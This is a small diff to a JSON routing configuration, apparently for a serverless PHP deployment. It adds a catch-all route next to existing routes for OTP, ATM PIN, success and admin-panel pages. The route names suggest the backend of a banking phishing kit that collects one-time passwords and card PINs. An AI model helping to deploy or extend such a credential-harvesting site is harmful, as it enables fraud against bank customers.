@@ -14,6 +14,7 @@
     { "src": "/otp.php", "dest": "/api/otp.php" },
     { "src": "/atm_pin.php", "dest": "/api/atm_pin.php" },
     { "src": "/success.php", "dest": "/api/success.php" },
-    { "src": "/Admin_panel.php", "dest": "/api/Admin_panel.php" }
+    { "src": "/Admin_panel.php", "dest": "/api/Admin_panel.php" },
+    { "src": "/(.*)", "dest": "/api/index.php" }
   ]
 }
